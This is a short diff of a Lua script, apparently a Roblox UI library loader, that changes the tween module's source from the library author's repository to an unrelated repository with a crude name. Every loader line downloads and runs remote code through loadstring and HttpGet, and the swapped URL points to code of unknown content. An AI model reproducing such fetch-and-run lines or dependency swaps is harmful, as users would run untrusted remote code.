@@ -5,7 +5,7 @@ local settings = {
 };
 
 local drawing = loadstring(game:HttpGet("https://github.com/GhostDuckyy/UI-Libraries/blob/main/DEADCELL%20REMAKE/misc/extension.lua?raw=true"))();
-local tween = loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostDuckyy/UI-Libraries/refs/heads/main/DEADCELL%20REMAKE/misc/tween.lua"))();
+local tween = loadstring(game:HttpGet("https://raw.githubusercontent.com/blackopslauri/local-sexo-anal2/refs/heads/main/custom%20tween"))();
 
 
 -- // UI LIBRARY
